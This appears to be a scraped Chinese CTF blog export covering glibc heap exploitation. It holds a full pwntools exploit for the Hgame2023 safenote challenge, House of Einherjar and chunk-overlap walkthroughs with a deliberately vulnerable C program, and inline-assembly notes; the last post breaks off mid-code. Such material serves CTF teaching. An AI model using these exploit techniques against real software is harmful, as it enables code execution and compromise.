如果我们想要通过tcachebin获取任意地址的堆块 只需要将对应地址异或(堆基址&gt;&gt;12) 前提是你没有申请超过0x1000大小的chunk 致使对应的chunk到了下一页 真题分析Hgame2023-week3-safenote题目环境2.32 做题环境ubuntu18 libc2.27 一共给了四个函数add函数 可以申请0xff大小以下的chunkdelete函数 释放chunk后并没有置零指针 存在UAFedit函数 没有办法堆溢出show函数 调用puts函数输出堆块内容 非常常规的一道题 无非就是利用UAF实现libc基址的泄露 并且利用tcache打hook 但是因为版本在libc2.32 所以有几个地方需要注意 由于最大只能申请0xff大小的chunk 并且没有办法chunk extend 所以这里采用填满tcache链表的办法使得chunk被释放到unsortedbin中 for i in range(8): add(i,0x80)delete(0)show(0)heap_addr = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12success(&quot;heap_addr :&quot;+hex(heap_addr)) 同时我们可以多申请一个chunk 利用这个chunk来泄露堆基址 紧接着填满tcache链表后再释放一个chunk进入unsortedbin 从而泄露libc基址 add(8,0x10) #防止unsortedbin合并for i in range(1,8): delete(i)edit(7,&#x27;\\x11&#x27;)show(7)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x11success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7fea010bfc00-0x7fea00edc000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]onegadget_addr = libc_addr + 0xdf54f 这里之所以要修改chunk7的最后一个字节再打印出来 是因为该版本的main_arena_addr+96最后一个字节是00 如果直接泄露的话 显然是会被截断 接下来的任务就很简单了 打free_hook payload = (heap_addr&gt;&gt;12)^(free_hook)edit(6,p64(payload))add(9,0x80)add(10,0x80)edit(10,p64(onegadget_addr))delete(0)io.interactive() 完整exp: from pwn import*io = process(&quot;./pwn&quot;)#io = remote(&quot;47.99.93.110&quot;,10001)context.log_level = &quot;debug&quot;libc = ELF(&quot;/home/chen/2.32-0ubuntu3.2_amd64/libc-2.32.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]elf = ELF(&quot;./pwn&quot;)def debug(): gdb.attach(io) pause()def add(index,size): io.sendlineafter(&quot;5. Exit&quot;,b&#x27;1&#x27;) io.sendlineafter(&quot;Index: &quot;,str(index)) io.sendlineafter(&quot;Size: &quot;,str(size))def delete(index): io.sendlineafter(&quot;5. Exit&quot;,b&#x27;2&#x27;) io.sendlineafter(&quot;Index: &quot;,str(index))def edit(index,content): io.sendlineafter(&quot;5. Exit&quot;,b&#x27;3&#x27;) io.sendlineafter(&quot;Index: &quot;,str(index)) io.sendafter(&quot;Content: &quot;,content)def show(index): io.sendlineafter(&quot;5. Exit&quot;,b&#x27;4&#x27;) io.sendlineafter(&quot;Index: &quot;,str(index))for i in range(8): add(i,0x80)delete(0)show(0)heap_addr = u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))&lt;&lt;12success(&quot;heap_addr :&quot;+hex(heap_addr))add(8,0x10)for i in range(1,8): delete(i)edit(7,&#x27;\\x11&#x27;)show(7)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x11success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7fea010bfc00-0x7fea00edc000)success(&quot;libc_addr :&quot;+hex(libc_addr))free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]onegadget_addr = libc_addr + 0xdf54fpayload = (heap_addr&gt;&gt;12)^(free_hook)edit(6,p64(payload))add(9,0x80)add(10,0x80)edit(10,p64(onegadget_addr))delete(0)io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"House Of Einherjar","slug":"House-Of-Einherjar","date":"2023-03-02T02:32:18.000Z","updated":"2023-09-14T17:19:30.000Z","comments":true,"path":"2023/03/02/House-Of-Einherjar/","link":"","permalink":"http://example.com/2023/03/02/House-Of-Einherjar/","excerpt":"","text":"基于chunk overlapping的一种利用手法 旨在申请到任意地址的chunk 前言题目源码 各种漏洞都有 并且打印了堆基址 同时不打算开启pie 方便调试 //gcc -o testheap -no-pie testheap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];char magic_addr[1000];void bss_write()&#123; puts(&quot;For commissioning only&quot;); char *a[50]; read(0,a,0x50); puts(&quot;Input content&quot;); read(0,*a,0x100);&#125;void gift()&#123; puts(&quot;Convenient debugging&quot;); puts(&quot;Please enter the got table of the function&quot;); char a[0x20]; read(0,a,0x20); asm( &quot;pop %rsi\\n\\t&quot; &quot;mov $1,%rax\\n\\t&quot; &quot;mov $1,%rdi\\n\\t&quot; &quot;mov $8,%rdx\\n\\t&quot; &quot;syscall\\n\\t&quot; ); puts(&quot;Keep this gift&quot;);&#125;void init()&#123; setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123; puts(&quot;Life is fucking movie&quot;); puts(&quot;Life is always full of unhappiness, like this question&quot;); puts(&quot;Anyway, what&#x27;s your answer&quot;); puts(&quot;&gt;&quot;);&#125;void add()&#123; int index; char size[20]; puts(&quot;What do you really want?&quot;); if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123; if(!chunk_ptr[chunk_time])&#123; printf(&quot;This is the %dth choice in your life\\n&quot;,chunk_time); puts(&quot;You can customize the size of chunk, but what about your life&quot;); read(0,size,0x8); chunk_size[chunk_time] = atoi(size); chunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]); printf(&quot;chunk_addr is %x\\n&quot;,&amp;(*chunk_ptr[chunk_time])); puts(&quot;Although your life is a piece of shit, you still have the initiative, right?&quot;); read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]); chunk_time++; &#125;else&#123; puts(&quot;error&quot;); exit(0); &#125; &#125;else&#123; exit(0); puts(&quot;&quot;); &#125;&#125;void delete()&#123; char data[100]; int index; puts(&quot;I didn&#x27;t set the pointer to zero, just like some things can&#x27;t be repeated&quot;); scanf(&quot;%d&quot;,&amp;index); free(chunk_ptr[index]);&#125;void edit()&#123; int index; int chunksize; puts(&quot;It&#x27;s never too late to start again. What do you regret?&quot;); scanf(&quot;%d&quot;,&amp;index); puts(&quot;You all know that there can be overflows here, so why do you set limits on your life?&quot;); scanf(&quot;%d&quot;,&amp;chunksize); puts(&quot;Come back!&quot;); read(0,chunk_ptr[index],chunksize);&#125;void show()&#123; puts(&quot;You can&#x27;t live a perfect life without making any effort&quot;); int index; scanf(&quot;%d&quot;,&amp;index); puts(chunk_ptr[index]);&#125;int main()&#123; int choice; init(); puts(&quot;This program is used to debug heap vulnerabilities&quot;); puts(&quot;write by chen&quot;); while(1)&#123; menu(); scanf(&quot;%d&quot;,&amp;choice); switch(choice)&#123; case 1: add(); break; case 2: delete(); break; case 3: edit(); break; case 4: show(); break; case 5: gift(); break; case 6: bss_write(); break; case 7: puts(&quot;The fog of that morning cleared, not only in the morning, but also in the fog&quot;); puts(&quot;You will be stronger next time I see you&quot;); exit(0); break; &#125; &#125;&#125; 在上一篇文章中 我们介绍了利用修改prev_size里实现合并的手法 基于这个漏洞 我们更进一步来利用 我们知道 如果topchunk相邻低地址处的chunk处于free状态 除开fastbin和tcachebin 那么top chunk就会将其合并 此时top chunk的首地址就会成为被合并的chunk的地址 这其实是house of force的内容 不过这里我们并不直接修改top chunk的prev_size 而是修改与top chunk物理相邻的chunk的prev_size 首先我们需要知道 当plmalloc在处理后向合并的时候 新的chunk的地址是根据当前chunk减去prev_size得到的 并且后向合并的前置条件是要通过两个检查 假设此时我们已经在某个地方伪造好了fake chunk 并且此时堆结构如图所示 为了实现chunkA后向合并到fake chunk 我们需要使得chunkA_addr - prev_size &#x3D; fakechunk_addr chunk_at_offset(p, -((long) prevsize)) 同时还需要使得fake_chunk的size域和chunkA的prev_size域相同 if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\malloc_printerr (&quot;corrupted size vs. prev_size&quot;); 并且还要注意一下fake chunk的fd域和bk域 根据unlink的要求 我们需要使得fake chunk的fd域和bk域满足下面要求 if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); 不过这个相对来说很好绕过 我们只需要让fd和bk域都为fake chunk的地址就行了 这样FD-&gt;bk 的值也还是fake chunk的地址 同理BK-&gt;fd也是 同时还需要使得chunkA的inuse位为0 这样plmalloc才会认为chunkA低地址处存在一个位于bin的chunk 并且是可以合并的 if (!prev_inuse(p)) &#123;prevsize = prev_size(p);size += prevsize;p = chunk_at_offset(p, -((long) prevsize));unlink(av, p, bck, fwd);&#125; 根据上述要求 我们想要实现house of einherjar需要拥有以下条件 1.拥有堆溢出的能力 可以覆盖到next chunk的prev_size域和size域的最后一位2.拥有在目标地址构造fake chunk的能力3.拥有堆的基址来计算fake chunk和chunk的差值 下面我们开始实际利用 libc2.23我们假设题目自带了打印堆基址的功能 并且可以在bss段中构造fake chunk的机会 实际利用情况里需要读者自己根据实际题目判断是否可行 以及如何实现 本题目由笔者本人编写 漏洞点显而易见 仅供参考 bss_addr = 0x602320chunk0_addr = add(0x10,b&#x27;aaaa&#x27;)chunk0_addr = chunk0_addr * 0x1000 首先我们创建一个0x10大小的chunk 同时接收一下当前chunk的地址 也就是堆基址 这里之所以要乘以0x1000 是因为我出题的时候使用的是printf来输出 其遇到\\x00就直接截断了 所以无法打印出堆基址后的三个0 这里需要自己补上 add(0x80,b&#x27;aaaa&#x27;)chunk1_addr = chunk0_addr + 0x20prev_size = chunk1_addr-bss_addrpayload = cyclic(0x10)+p64(prev_size)+b&#x27;\\x90&#x27;edit(0,len(payload),payload) 随后我们再次申请一个chunk 这个chunk是用来实现本文漏洞的关键 最开始申请的chunk是用来堆溢出覆盖这个chunk的prev_size域和size域的inuse位 接着我们计算出chunk1_addr 和 prev_size应该要被设置成的值 接着利用chunk0的堆溢出漏洞覆盖chunk1的prev_size和inuse 此时堆的结构如图所示 接着在bss段上构造一个fake chunk 这里的函数是我为了方便演示特地写的 正常题目就别想了 payload = p64(0x90)+p64(prev_size)+p64(bss_addr)*2bss_write(p64(bss_addr),payload) 此时我们释放chunk1 看看其是否能过通过检查 为什么是top chunk跑到了fake chunk这边呢 同时addr还和我们fake chunk不一样 这是因为chunk1在和fake chunk合并之后 二者同样是一个物理相邻top chunk的堆块 所以top chunk就将其吞并 而这个addr是单纯的显示问题 我们试着申请一个chunk 看看写入的content位于哪里 add(0x20,b&#x27;gggggggg&#x27;) 可以看到写入成功 接下来 难度升级 我们来试试如果题目没有给我们赠送堆基址 我们要如何自己获取堆基址并且实现漏洞的利用 bss_addr = 0x602320add(0x10,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)delete(0)show(0)io.recv()heap_addr = u64(io.recv(4).ljust(8,b&#x27;\\x00&#x27;))-0x20success(&quot;heap_addr :&quot;+hex(heap_addr)) 首先我们申请两个任意大小的chunk 目的是为了将两个chunk放入到fastbin中 利用UAF获取其fd域内的堆地址 经过计算得到堆基址 接着我们需要把这两个chunk从fastbin中取出来 否则等下unlink的时候就会报错 原因暂时不清楚 add(0x10,b&#x27;aaaa&#x27;)#2add(0x10,b&#x27;aaaa&#x27;)#3add(0x80,b&#x27;aaaa&#x27;)#4 我们重新申请两个0x10大小的chunk 此时chunk2相当于chunk0 chunk3相当于chunk1 chunk4则是用来向后合并 利用漏洞的 接下来的手法就和之前的一致了 prev_size = heap_addr + 0x40 - bss_addrpayload = cyclic(0x10)+p64(prev_size)+b&#x27;\\x90&#x27;edit(3,len(payload),payload)payload = p64(0x100)+p64(prev_size)+p64(bss_addr)*2bss_write(p64(bss_addr),payload)delete(4) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"chunk extend and overlapping","slug":"chunk-extend-and-overlapping","date":"2023-03-01T04:50:33.000Z","updated":"2023-09-14T17:21:18.000Z","comments":true,"path":"2023/03/01/chunk-extend-and-overlapping/","link":"","permalink":"http://example.com/2023/03/01/chunk-extend-and-overlapping/","excerpt":"","text":"chunk extend的利用手法是基于plmalloc对于堆块的各种宏定义 其是通过计算chunk首地址和size大小来推断出上一个chunk或者是下一个chunk的地址 /* Ptr to next physical malloc_chunk. */#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) 获取下一个chunk的地址既是通过当前chunk地址加上当前chunk大小 /* Size of the chunk below P. Only valid if prev_inuse (P). */#define prev_size(p) ((p)-&gt;mchunk_prev_size)/* Ptr to previous physical malloc_chunk. Only valid if prev_inuse (P). */#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) 获取上一个chunk的地址则是通过当前chunk的地址减去前一个chunk的大小 也就是说 只要我们修改了chunk的size域和prev_size域 就可以使plmalloc误判chunk 堆溢出覆盖下一个chunk的size域这个手法主要有两种适用的题型 一种是有伴随堆块的情况下 并且没有堆溢出 通过这种手法可以修改伴随堆块的内容 第二种是libc2.27的情况下 tcachebin的存在会使得我们打unsortedbin造成很大的影响 要么就是填满链表要么就是申请一个超过tcachebin大小的chunk并释放 有的题目会对这两种解决办法进行限制 这个时候就可以利用这种办法来合并chunk 从而获得一个超过tcachebin范围的堆块 下面来分别演示一下 环境:ubuntu22 (二进制文件依赖的libc2.27) 目测2.23以上的版本都可以add(0x20,b&#x27;aaaa&#x27;)add(0x20,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)debug() 首先申请三个堆块 chunk1用来堆溢出 覆盖chunk2的size域 chunk3用来和chunk2合并 唯一要注意的是覆盖size域的值 需要包括两个堆块的prev_size域和size域 所以此时用来覆盖chunk2的size域的数值应为0x51 add(0x20,b&#x27;aaaa&#x27;)add(0x20,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x28)+b&#x27;\\x51&#x27;edit(0,len(payload),payload)debug() 此时chunk2就和chunk3合并了 此时chunk2的指针指向的仍然是chunk2的首地址 但是plmalloc已经误判了chunk2 原本其是一个0x31大小的chunk 此时plmalloc误判其还包含了chunk3 所以释放chunk2就会一并释放chunk3 可以看到一并放入了tcache 这里之所以没有和top chunk合并 是因为tcache中的chunk Inuse位仍然为1 此时我们申请一个0x40大小的chunk 就可以获得原本chunk3的空间 从而对chunk3的内容进行任意修改 此外还有一种情况 如果chunk2先被释放进入tcachebin后再更改size域会发生什么呢 add(0x20,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)payload = cyclic(0x28)+p64(0x441)delete(1)edit(0,len(payload),payload)debug() 此时注意 chunk2不能位于fastbin或者是tcachebin中 如果位于二者中 下一个chunk的Inuse位就不会为0 这样就不会合并 gdb动调看一下是否合并成功 环境: ubuntu16 二进制依赖libc2.23这类的利用手法被称为overpadding 你可以理解为反方向的合并 刚才是由chunk2吞并chunk3 修改的是chunk2的size域 现在我们来修改chunk3的prev_size域和size域 从而使得chunk2合并chunk3 这里的知识点其实和unlink有点相似 unlink也是通过构造fake chunk 伪造好next chunk的prev_size和size add(0x80,b&#x27;aaaa&#x27;) #0add(0x10,b&#x27;aaaa&#x27;) #1add(0x80,b&#x27;aaaa&#x27;) #2add(0x10,b&#x27;aaaa&#x27;) #3 首先申请四个chunk 前三个用来负责合并 第四个用来保证不和top chunk合并 我们以chunk1来为堆溢出的起点 覆盖chunk2的prev_size和size域 不过在此之前还需要先释放chunk0到unsortedbin中(只要不是fastbin和tcachebin就可以) 这样才能使得后面的合并生效 add(0x80,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)add(0x80,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)payload = cyclic(0x10)+p64(0xb0)+p64(0x90)edit(1,len(payload),payload) 注意一下chunk2的size域 Inuse位一定要为0 否则不会合并 此时我们释放chunk2 来看看是否合并成功 这种一般是伴随堆块先申请的情况可以利用 从而获取到低地址处堆块任意写的机会 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"内联汇编对于pwn出题的一些心得","slug":"内联汇编对于pwn出题的一些心得","date":"2023-02-27T15:07:34.000Z","updated":"2023-09-14T17:21:14.000Z","comments":true,"path":"2023/02/27/内联汇编对于pwn出题的一些心得/","link":"","permalink":"http://example.com/2023/02/27/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96%E5%AF%B9%E4%BA%8Epwn%E5%87%BA%E9%A2%98%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BF%83%E5%BE%97/","excerpt":"","text":"前言如果只运用c语言进行编写pwn题目 对于一些寄存器或者栈结构一类的没有办法操控 这时候利用内联汇编就可以巧妙的解决问题的所在 同时由于我想学习免杀 其中有一种利用方法为内联汇编花指令 刚好可以利用这个来打基础 本文会伴随着本人对于内联汇编的不断学习而更新 不全面也不严谨 仅供参考 内联函数在编写c语言时 如果你在一个函数中调用另外一个函数 其是通过call指令来进行跳转 跳转到对应函数的地址开始执行函数内容最后通过存储在bp寄存器中的原函数地址来返回比如下面这个程序 #include &lt;stdio.h&gt;void test()&#123; puts(&quot;hello world&quot;);&#125;int main()&#123; test();&#125; 其汇编形式如下图所示 如果是一个循环调用函数 那么就会造成栈空间过于陈杂 这个时候就可以使用内联函数来解决问题 在对应函数定义时前缀加上inline #include &lt;stdio.h&gt;inline void test()&#123; puts(&quot;hello world&quot;);&#125;int main()&#123; test();&#125; 此时当main函数执行到调用test函数的时候 会直接在当前栈中执行test函数 而非跳转 但是你会发现正常编译会报错未定义的函数 我们需要手动链接 先将其编译成.o格式的文件 再进行动态链接 gcc -O -c -o test test.cgcc test.o -lgmp -o test 内联汇编基本内联汇编基于上述你对内联函数的认识 那么显然易见 内联汇编就相当于我们直接往对应位置写入汇编代码 这就使得我们拥有了在程序编写的初期就拥有了操控寄存器值的能力 或者是修改栈结构 篡改程序执行流 对于pwn题来说 常用的编译是基于GCC的 而GCC采用的是AT&amp;T&#x2F;UNIX 汇编语法 不同的汇编语法对于内联汇编的编写格式要求不一样 正常的一个汇编语句 比如要使得rax寄存器赋值为1 需要这样编写 mov rax,1 而受汇编语法约束的内联汇编需要这样编写 mov $1,%rax 也就是使得源操作数和目的操作数调换位置 其中1是属于一个立即操作数 我们需要在其前面添加一个$符号 否则1会被识别为一个地址 00001131 488b042501000000 mov rax, qword [__elf_header.ident.signature[1]] &#123;0x10102464c45&#125; 可以看到其被识别为了ELF文件的文件头结构体中的第一个元素的第一个字节 00000000 struct Elf64_Header __elf_header = 00000000 &#123;00000000 struct Elf64_Ident ident = 00000000 &#123;00000000 char signature[0x4] = &quot;\\x7fELF&quot;00000004 uint8_t file_class = 0x200000005 uint8_t encoding = 0x100000006 uint8_t version = 0x100000007 uint8_t os = 0x000000008 uint8_t abi_version = 0x000000009 char pad[0x7] = &quot;\\x00\\x00\\x00\\x00\\x00\\x00&quot;, 000000010 &#125; 我们需要使得计算机明白1在这里是一个即时操作数 而非地址 所以需要加上$符号 至于rax寄存器前面的%符号 是寄存器的固定格式 同时和常规汇编一致 在操作符后面加上特定字符 可以决定操作数的字节大小 诸如’b’ ‘w’ ‘l’ 如果我们想要调用寄存器中的值 可以用括号将寄存器套起来 mov (%rbx),%rax 00001131 488b03 mov rax, qword [rbx] 最后 对于每行的汇编语句结束以后 都需要加上’\\t\\n‘ 以此来区分每行汇编 并且每行汇编都需要加上双引号 如下: #include &lt;stdio.h&gt;int main()&#123; asm( &quot;mov (%rbx),%rax\\n\\t&quot; );&#125; 扩展内联汇编上述的基本内联汇编 往往只局限于内联汇编中的数据操作 而在扩展形式中 我们还可以指定操作数 并且可以选择输入输出寄存器 以及指明要修改的寄存器列表 asm ( assembler template : output operands /* optional */ : input operands /* optional */ : list of clobbered registers /* optional */); 上面是扩展内联汇编的基本格式 第一个冒号后面指定的是输出操作数 第二个冒号指定的是输入操作数 第三个冒号解释起来复杂 由于内联汇编是直接插入在我们原本的函数汇编代码中 再加上我们对于寄存器的值进行了操作 这会对正常函数的执行造成影响 所以我们需要在这里列出损坏的寄存器列表 让系统执行完内联汇编后还原一下寄存器的值 使用memory可以还原所有寄存器 asm ( &quot;mov %1, %%rax\\n\\t&quot; &quot;mov %%rax, %0\\n\\t&quot; :&quot;=m&quot;(b) /* output */ :&quot;m&quot;(a) /* input */ :&quot;memory&quot; /* clobbered register */ ); 下面我们基于上述的一段扩展内联汇编来帮助分析 开头的两行汇编属于汇编指令部分 语法问题和基本内联汇编一致 唯一要注意的是第一行的%1是什么 其代表的是我们引入的输入操作数a 其在整个扩展内联汇编中是第二个变量 也就是说我们想要引用输出变量b 就是%0 所以是从0开始递增的 接着来看”&#x3D;m” 其中’&#x3D;’是约束修饰符 用来指定其为输出操作数并且是可写的 ‘m’也同为约束符 通常是用来指定这个操作数的存放 “a” 将输入变量放入eax“b” 将输入变量放入ebx“c” 将输入变量放入ecx“d” 将输入变量放入edx“S” 将输入变量放入esi“D” 将输入变量放入edi“q” 将输入变量放入eax，ebx ,ecx ，edx中的一个“r” 将输入变量放入通用寄存器，也就是eax ，ebx，ecx,edx，esi，edi中的一个“A” 放入eax和edx，把eax和edx，合成一个64位的寄存器(uselong longs)“m” 内存变量“o” 操作数为内存变量，但是其寻址方式是偏移量类型，也即是基址寻址，或者是基址加变址寻址“V” 操作数为内存变量，但寻址方式不是偏移量类型“,” 操作数为内存变量，但寻址方式为自动增量“p” 操作数是一个合法的内存地址（指针）“g” 将输入变量放入eax，ebx，ecx ，edx中的一个或者作为内存变量“X” 操作数可以是任何类型“I” 0-31 之间的立即数（用于32位移位指令）“J” 0-63 之间的立即数（用于64 位移位指令）“N” 0-255 ，之间的立即数（用于out 指令）“i” 立即数“n” 立即数，有些系统不支持除字以外的立即数，这些系统应该使用“n”而不是“i”“=” 操作数在指令中是只写的（输出操作数）“+” 操作数在指令中是读写类型的（输入输出操作数）“f” 浮点数“t” 第一个浮点寄存器“u” 第二个浮点寄存器“G” 标准的80387% 该操作数可以和下一个操作数交换位置# 部分注释* 表示如果选用寄存器，则其后的字母被忽略“&amp;” 表示输入和输出操作数不能使用相同的寄存器 对于一个char数组 一般是用’m’来约束 其他的我测试是会报错 同时 只能操作一个字长的数据 超过了就不行了 运用在pwn中泄露libc基址这个一般是用来自己方便调试的 这样可以帮助我们快速获取libc基址 比如我堆系列的博客用到的示例程序就使用了相同的代码来方便我快速获取libc基址 从而可以在exp中更自由的调试 char a[0x20]; read(0,a,0x20); asm( &quot;pop %rsi\\n\\t&quot; &quot;mov $1,%rax\\n\\t&quot; &quot;mov $1,%rdi\\n\\t&quot; &quot;mov $8,%rdx\\n\\t&quot; &quot;syscall\\n\\t&quot; ); 原理就是利用向局部变量a中输入数据 其会被存放在栈上 同时rsp指针指向了输入的数据 这个时候调用pop指令出栈 就成功的把数据传到了寄存器rsi 这个时候调用write函数 就可以直接打印出函数真实地址了 调整寄存器值这个办法比较简单 第一次被我利用是在出canary那一题的时候 用来调整函数结束时寄存器的值 引导解题者手写shellcode 或者进行合理的rop链构造 asm( &quot;mov $1,%rax\\n\\t&quot; &quot;mov %rax,%rdi\\n\\t&quot; ); 比较简单就不解释了 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"}],"tags":[]},{"title":"tcachebinattack","slug":"tcachebinattack","date":"2023-02-25T10:46:13.000Z","updated":"2023-09-14T17:20:50.000Z","comments":true,"path":"2023/02/25/tcachebinattack/","link":"","permalink":"http://example.com/2023/02/25/tcachebinattack/","excerpt":"","text":"在libc2.26以后 加入了tcachebins 其与fastbin同为单向链表 作用类似于一个缓存区 当用户申请chunk时 优先在tcache中查找 如果无果才进入分配区 #if USE_TCACHE/* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */# define TCACHE_MAX_BINS 64# define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1)/* Only used to pre-fill the tunables. */# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)/* When &quot;x&quot; is from chunksize(). */# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)/* When &quot;x&quot; is a user-provided size. */# define usize2tidx(x) csize2tidx (request2size (x))/* With rounding and alignment, the bins are... idx 0 bytes 0..24 (64-bit) or 0..12 (32-bit) idx 1 bytes 25..40 or 13..20 idx 2 bytes 41..56 or 21..28 etc. *//* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */# define TCACHE_FILL_COUNT 7#endif tcache的定义如上 简单来说就是一个范围0x10-0x408大小(用户申请大小)的单向链表 一共可以存储64个chunk 每个链表可以存储7个chunk // 从 tcache list 中获取内存 if (tc_idx &lt; mp_.tcache_bins // 由 size 计算的 idx 在合法范围内 /*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/ /* to appease gcc */ &amp;&amp; tcache &amp;&amp; tcache-&gt;entries[tc_idx] != NULL) // 该条 tcache 链不为空 &#123; return tcache_get (tc_idx); &#125; DIAG_POP_NEEDS_COMMENT;#endif // 进入与无 tcache 时类似的流程 if (SINGLE_THREAD_P) &#123; victim = _int_malloc (&amp;main_arena, bytes); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || &amp;main_arena == arena_for_chunk (mem2chunk (victim))); return victim; &#125; 当用户从tcache中申请内存的时候并非是和fastbin一样通过__int_malloc函数来实现 而是通过专用的**tcache_get()**函数 其调用优先度高于fastbin 当有合适大小的chunk被申请时 如果tcache满足条件那么优先从tcache中申请 libc2.26以及老版本的2.27tcache最早于2.26诞生 但是2.26的glibc由于是过渡版本 glibc-all-in-one下载不到 我在其他渠道下载到了glibc2.26并没有符号表 所以不好演示 自己尝试编译了glibc但是最后以失败告终 好在2.26和老版本的2.27有着同样的漏洞 所以这里我们一概而论 这时候的tcache对于double free甚至没有检测 我们直接两次释放同一个chunk 可以看到成功释放进去了 add(0x68,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(0)delete(0)debug() 并且tcachebin对于chunk的取出也没有进行限制 add(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]add(0x68,p64(free_hook))debug() 此时已经将free_hook放入到了链表中 我们尝试将其取出 add(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)free_hook = libc_addr + libc.sym[&#x27;__free_hook&#x27;]success(&quot;free_hook :&quot;+hex(free_hook))add(0x68,p64(free_hook))add(0x68,b&#x27;aaaa&#x27;)add(0x68,b&#x27;aaaa&#x27;)debug() 并且可以看到 tcache和fastbin不同的在于 其指向的是chunk的用户区首地址 高版本2.27版本高一点的glibc-2.27引入了对于double free的检查 add(0x68,b&#x27;aaaa&#x27;)add(0x410,b&#x27;aaaa&#x27;)add(0x10,b&#x27;aaaa&#x27;)delete(1)show(1)main_arena_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(&quot;main_arena_addr :&quot;+hex(main_arena_addr))libc_addr = main_arena_addr - (0x7f688abebca0-0x7f688a800000)success(&quot;libc_addr :&quot;+hex(libc_addr))delete(0)delete(0)io.recv()io.recv() 我们还是和上一题一样 这里直接两次释放chunk0 但是与之不同的是被检测出来了double free 那有没有什么可以绕过的办法呢 类似fastbin一样的? 我们来看一下tcache对于double free检查机制的源码 typedef struct tcache_entry&#123; struct tcache_entry *next; //链表指针，对应chunk中的fd字段 /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; //指向所属的tcache结构体，对应chunk中的bk字段&#125; tcache_entry; 对于每一个tcache都有一个key指针指向 借助这个key指针 plmalloc可以更好的对double free进行检查 size_t tc_idx = csize2tidx(size);//只要tcache不为空 并且free chunk在tcache范围中 都需要进行double free检查 if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it&#x27;s already in the tcache. */ tcache_entry *e = (tcache_entry *)chunk2mem(p); /* 如果是这个chunk已经被放入tcache 那么key字段就已经有数据了 会被识别出来 */ if (__glibc_unlikely(e-&gt;key == tcache))//汇报错误信息 